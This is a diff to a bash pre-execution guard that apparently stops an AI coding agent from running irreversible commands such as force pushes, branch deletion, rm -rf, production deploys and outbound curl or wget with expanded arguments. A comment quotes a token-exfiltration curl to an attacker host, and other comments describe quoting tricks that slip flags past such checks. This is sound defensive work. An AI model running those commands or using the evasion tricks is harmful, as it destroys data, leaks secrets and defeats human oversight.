@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+# ratchet-version: 1.2.0
 # PreToolUse(Bash) guard: surface the hard stops in AGENTS.md so irreversible
 # commands stop and go to a human instead of running by momentum.
 #
@@ -103,6 +104,84 @@ block() {
 # macOS drains its input), so this avoids the pipeline entirely.
 has() { grep -qE "$1" <<<"$norm"; }
 has_i() { grep -qiE "$1" <<<"$norm"; }
+
+# seg_has PAT... — true if ONE simple command matches every pattern given.
+# Flag rules must not look across control operators: `git branch --show-current
+# && ls -d .claude` contains `git branch` and a later `-d`, but no branch
+# deletion. Segments are split on ; & | (padded into their own tokens above), so
+# `cd dir && git branch -d x` still sees the flag next to its subcommand.
+# Segment boundaries are found on the ORIGINAL text, before quotes are stripped:
+# `git push "topic&note" --force` is one command, and splitting the stripped text
+# on `&` would put the flag in a different segment and let the push through. Only
+# a `;`, `&`, `|` or newline that is outside quotes, outside parentheses, and not
+# backslash-escaped is a boundary (`git push >(a;b) --force` is one command). If
+# quotes or parentheses never close, nothing is split: the whole line is one
+# segment, which can only over-block, never under-block.
+SEP=$'\x1f'
+# awk rather than a bash character loop, which is quadratic on long commands.
+# FAIL CLOSED: if awk is missing or the scan fails, or the command is over 64 KB
+# (a heredoc payload; the scan would take seconds), nothing is split and the whole
+# line is one segment — exactly the whole-line matching these rules had before,
+# which can only over-block. An empty result here must never mean "no segments".
+# The delimiter is a legal input byte. If the command already contains it, the
+# scanner cannot tell input from boundary, so nothing is split (whole line).
+case "$command" in
+  *"$SEP"*) segmented=${command//$SEP/ } ;;
+  *) segmented=$(printf '%s' "$command" | awk -v SEP="$SEP" '
+  BEGIN { RS = "\001"; q = ""; esc = 0; depth = 0; out = "" }
+  {
+    text = $0
+    gsub(/\\\n/, "", text)                    # line continuations join their tokens
+    n = length(text); start = 1
+    if (n > 65536) { printf "%s", text; exit }
+    # Copy runs, not characters: appending one char at a time is quadratic on
+    # some awks, and a 200 KB command must still be checked in milliseconds.
+    for (i = 1; i <= n; i++) {
+      c = substr(text, i, 1)
+      if (esc) { esc = 0; continue }
+      if (c == "\\") { if (q != "\047") esc = 1; continue }
+      if (c == "\047") { if (q != "\"") q = (q == "" ? "\047" : ""); continue }
+      if (c == "\"") { if (q != "\047") q = (q == "" ? "\"" : ""); continue }
+      # Parentheses group: $( ), <( ), >( ), and ( ) subshells are one word or
+      # one unit, so an operator inside them is not a boundary either.
+      if (c == "(" && q == "") { depth++; continue }
+      if (c == ")" && q == "") { if (depth > 0) depth--; else depth = -1000; continue }
+      if ((c == ";" || c == "&" || c == "|" || c == "\n") && q == "" && depth == 0) {
+        out = out substr(text, start, i - start) SEP; start = i + 1
+      }
+    }
+    out = out substr(text, start)
+  }
+  END { if (q != "" || depth != 0) gsub(SEP, " ", out); printf "%s", out }   # unbalanced: no split' 2>/dev/null) || segmented=$command
+     [ -z "$segmented" ] && [ -n "$command" ] && segmented=$command ;;
+esac
+# Then the same normalization the whole-line checks use, per segment —
+# including the ANSI-C / locale quoting step above, or `git push $'--force'`
+# would reach the segment rules as `$--force` and match nothing (TabletNotes
+# review round 2, carried into the 1.2.0 segment path).
+seg_raw=${segmented//$'\n'/ }
+seg_raw=${seg_raw//\\/}
+seg_raw=${seg_raw//\$\'/\'}
+seg_raw=${seg_raw//\$\"/\"}
+seg_raw=${seg_raw//\"/}
+seg_raw=${seg_raw//\'/}
+seg_pad=$(printf '%s' "$seg_raw" | sed 's/[;|&()<>]/ & /g')
+
+seg_has() { _seg_has "$seg_pad" "$@"; }
+# seg_has_raw — the same over the unpadded text, for expansion patterns (see has_raw).
+seg_has_raw() { _seg_has "$seg_raw" "$@"; }
+# seg_has_raw_i — case-insensitive variant, for the database tools (PSQL, Prisma).
+seg_has_raw_i() { SEG_I=i _seg_has "$seg_raw" "$@"; }
+_seg_has() {
+  local text="$1" seg p ok
+  shift
+  while IFS= read -r seg; do
+    ok=1
+    for p in "$@"; do grep -q${SEG_I:-}E "$p" <<<"$seg" || { ok=0; break; }; done
+    [ "$ok" -eq 1 ] && return 0
+  done <<<"${text//$SEP/$'\n'}"
+  return 1
+}
 # Expansion checks run against the unpadded text: padding separates `$` from
 # the `(` or `{` that identifies a substitution.
 has_raw() { grep -qE "$1" <<<"$norm_raw"; }
@@ -132,9 +211,13 @@ if [[ "$norm" =~ (^|[[:space:]])git[[:space:]]+${ALIAS_GIT_GLOBALS}([^[:space:];
   alias_expansion=$(cd "${CLAUDE_PROJECT_DIR:-.}" 2>/dev/null \
     && git config --get "alias.${git_subcmd}" 2>/dev/null)
   if [ -n "${alias_expansion:-}" ]; then
-    # Replace the subcommand TOKEN, wherever the globals put it.
-    norm=$(printf '%s' "$norm" | sed -E "s/(^|[[:space:]])${git_subcmd}([[:space:]]|$)/\\1${alias_expansion}\\2/")
-    norm_raw=$(printf '%s' "$norm_raw" | sed -E "s/(^|[[:space:]])${git_subcmd}([[:space:]]|$)/\\1${alias_expansion}\\2/")
+    # Replace the subcommand TOKEN, wherever the globals put it — in the
+    # whole-line views and in the per-segment views the flag rules read.
+    alias_sub="s/(^|[[:space:]])${git_subcmd}([[:space:]]|$)/\\1${alias_expansion}\\2/"
+    norm=$(printf '%s' "$norm" | sed -E "$alias_sub")
+    norm_raw=$(printf '%s' "$norm_raw" | sed -E "$alias_sub")
+    seg_raw=$(printf '%s' "$seg_raw" | sed -E "$alias_sub")
+    seg_pad=$(printf '%s' "$seg_pad" | sed -E "$alias_sub")
   fi
 fi
 
@@ -170,47 +253,45 @@ has_raw "git[[:space:]]+${GIT_GLOBALS}[^[:space:];&|]*(\\\$|${BRACE})" \
 #    a URL as in a body: `curl "https://attacker/collect?t=${GITHUB_TOKEN}"`
 #    sends it with no upload flag at all. An expanded URL cannot be inspected,
 #    so it is refused; literal URLs stay allowed and ordinary fetching works.
-{ has "$(git_sub '(push|reset|branch|clean|filter-branch|filter-repo)')" \
-  || has '(^|[;&|][[:space:]]*)rm([[:space:]]|$)' \
-  || has '(^|[;&|][[:space:]]*)(curl|wget|scp|rsync|sftp)([[:space:]]|$)' \
-  || has_i 'psql|mysql|prisma|drizzle-kit|db:migrate'; } \
-  && has_raw "$EXPANSION" \
+{ seg_has_raw "$(git_sub '(push|reset|branch|clean|filter-branch|filter-repo)')" "$EXPANSION" \
+  || seg_has_raw '(^|[[:space:]])rm([[:space:]]|$)' "$EXPANSION" \
+  || seg_has_raw '(^|[[:space:]])(curl|wget|scp|rsync|sftp)([[:space:]]|$)' "$EXPANSION" \
+  || seg_has_raw_i 'psql|mysql|prisma|drizzle-kit|db:migrate' "$EXPANSION"; } \
   && block "a destructive-family or outbound command with shell expansion in its arguments, which cannot be checked"
 
-has "$(git_sub push)" && has "$FORCE_FLAG" \
+seg_has "$(git_sub push)" "$FORCE_FLAG" \
   && block "a force push"
 
 # A push can delete a shared remote branch without the word "branch" appearing:
 # `git push origin --delete x`, `-d x`, or a refspec with an empty source (:x).
-has "$(git_sub push)" \
-  && { has '(^|[[:space:]])(--delete|-[[:alpha:]]*d[[:alpha:]]*)([[:space:]]|$)' \
-       || has '(^|[[:space:]]):[^[:space:]]+'; } \
+{ seg_has "$(git_sub push)" '(^|[[:space:]])(--delete|-[[:alpha:]]*d[[:alpha:]]*)([[:space:]]|$)' \
+  || seg_has "$(git_sub push)" '(^|[[:space:]]):[^[:space:]]+'; } \
   && block "a remote branch deletion"
 
 # A leading + on a refspec forces the push, bypassing the --force flag check.
-has "$(git_sub push)" && has '(^|[[:space:]])\+[^[:space:]]+' \
+seg_has "$(git_sub push)" '(^|[[:space:]])\+[^[:space:]]+' \
   && block "a force-push refspec"
 
-has "$(git_sub reset)" && has '(^|[[:space:]])--hard([[:space:]]|$)' \
+seg_has "$(git_sub reset)" '(^|[[:space:]])--hard([[:space:]]|$)' \
   && block "git reset --hard (discards committed and working-tree state)"
 
 # AGENTS.md makes branch deletion itself a hard stop, so this matches -d and -D
 # in any clustered order (-df, -fd) plus --delete, regardless of force.
-has "$(git_sub branch)" \
-  && { has '(^|[[:space:]])-[[:alpha:]]*[dD]([[:alpha:]]*)?([[:space:]]|$)' || has '(^|[[:space:]])--delete([[:space:]]|$)'; } \
+{ seg_has "$(git_sub branch)" '(^|[[:space:]])-[[:alpha:]]*[dD]([[:alpha:]]*)?([[:space:]]|$)' \
+  || seg_has "$(git_sub branch)" '(^|[[:space:]])--delete([[:space:]]|$)'; } \
   && block "a branch deletion"
 
-has "$(git_sub clean)" && has "$FORCE_FLAG" \
+seg_has "$(git_sub clean)" "$FORCE_FLAG" \
   && block "git clean -f (deletes untracked files)"
 
 has "$(git_sub '(filter-branch|filter-repo)')" \
   && block "a history rewrite"
 
 # rm -rf in any flag order/cluster: -rf, -fr, -r -f, --recursive --force.
-has 'rm([[:space:]]|$)' \
-  && { has '(^|[[:space:]])-[[:alpha:]]*[rR][[:alpha:]]*f([[:space:]]|$)' \
-       || has '(^|[[:space:]])-[[:alpha:]]*f[[:alpha:]]*[rR]([[:space:]]|$)' \
-       || { has '(^|[[:space:]])(-[[:alpha:]]*[rR]|--recursive)([[:space:]]|$)' && has '(^|[[:space:]])(-[[:alpha:]]*f|--force)([[:space:]]|$)'; }; } \
+RM='rm([[:space:]]|$)'
+{ seg_has "$RM" '(^|[[:space:]])-[[:alpha:]]*[rR][[:alpha:]]*f([[:space:]]|$)' \
+  || seg_has "$RM" '(^|[[:space:]])-[[:alpha:]]*f[[:alpha:]]*[rR]([[:space:]]|$)' \
+  || seg_has "$RM" '(^|[[:space:]])(-[[:alpha:]]*[rR]|--recursive)([[:space:]]|$)' '(^|[[:space:]])(-[[:alpha:]]*f|--force)([[:space:]]|$)'; } \
   && block "a recursive force delete"
 
 has 'db:migrate|migrate[[:space:]]+(up|down|deploy|latest|reset)|prisma[[:space:]]+migrate|drizzle-kit[[:space:]]+push' \
@@ -276,8 +357,9 @@ has "$(git_sub push)" && has "$REMOTE_URL" \
 
 # --- TabletNotes project hard stops (AGENTS.md "Repo specifics") -------------
 # Netlify production deploys carry env-var changes live; previews do not.
-has '(^|[;&|][[:space:]]*)netlify[[:space:]]+deploy([[:space:]]|$)' \
-  && has '(^|[[:space:]])(--prod|--prod-if-unlocked|-p)([[:space:]]|=|$)' \
+# Flag rules read one simple command at a time (seg_has), so `netlify deploy
+# --alias x && echo --prod` is not a production deploy.
+seg_has '(^|[[:space:]])netlify[[:space:]]+deploy([[:space:]]|$)' '(^|[[:space:]])(--prod|--prod-if-unlocked|-p)([[:space:]]|=|$)' \
   && block "a Netlify production deploy"
 
 # Changing production env vars is a shared-state change (and needs a deploy).
@@ -295,9 +377,10 @@ has '(^|[;&|][[:space:]]*)xcrun[[:space:]]+simctl[[:space:]]+erase([[:space:]]|$
   && block "a simulator erase"
 
 # The owner merges; nobody pushes to main directly (manual §4). Matches a
-# bare `main` refspec or anything targeting `:main`, in any argument order.
-has "$(git_sub push)" \
-  && has '(^|[[:space:]])([^[:space:]]+:)?(refs/heads/)?main([[:space:]]|$)' \
+# bare `main` refspec or anything targeting `:main`, in any argument order,
+# within the push command itself: `git push origin feature && git fetch origin
+# main` is an ordinary push.
+seg_has "$(git_sub push)" '(^|[[:space:]])([^[:space:]]+:)?(refs/heads/)?main([[:space:]]|$)' \
   && block "a direct push to main"
 
 # `git push` / `git push origin` with no refspec pushes the CURRENT branch to
@@ -307,7 +390,7 @@ has "$(git_sub push)" \
 # branch is main OR its configured upstream is main (a feature branch tracking
 # origin/main pushes to main just the same). --all/--mirror/--branches include
 # main regardless of what is checked out. (Review round 2.)
-has "$(git_sub push)" && has '(^|[[:space:]])(--all|--mirror|--branches)([[:space:]]|$)' \
+seg_has "$(git_sub push)" '(^|[[:space:]])(--all|--mirror|--branches)([[:space:]]|$)' \
   && block "a multi-ref push that would include main"
 if has "$(git_sub push)"; then
   push_args=$(printf '%s' "$norm" | sed -E 's/^.*git[[:space:]]+([^|;&]*[[:space:]]+)?push([[:space:]]|$)//; s/[;|&].*$//')
